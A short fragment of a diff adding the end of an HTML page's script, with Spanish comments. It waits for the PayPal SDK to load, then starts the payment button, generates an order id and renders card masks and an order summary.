+  // Inicializar PayPal cuando el DOM esté listo
+  document.addEventListener('DOMContentLoaded', function() {
+    // Esperar a que el SDK se cargue completamente
+    function waitForPayPal() {
+      if (window.paypal) {
+        initPayPal();
+      } else {
+        setTimeout(waitForPayPal, 500);
+      }
+    }
+    
+    // Dar tiempo extra para que la función serverless responda
+    setTimeout(waitForPayPal, 2000);
+  });
+
+  // Inicializar
+  ordenInput.value = genOrderId();
+  updateCardMask();
+  updateCardMaskDestinatario();
+  calcularMontoTarjeta();
+  renderResumen();
+</script>
+</body>
+</html>
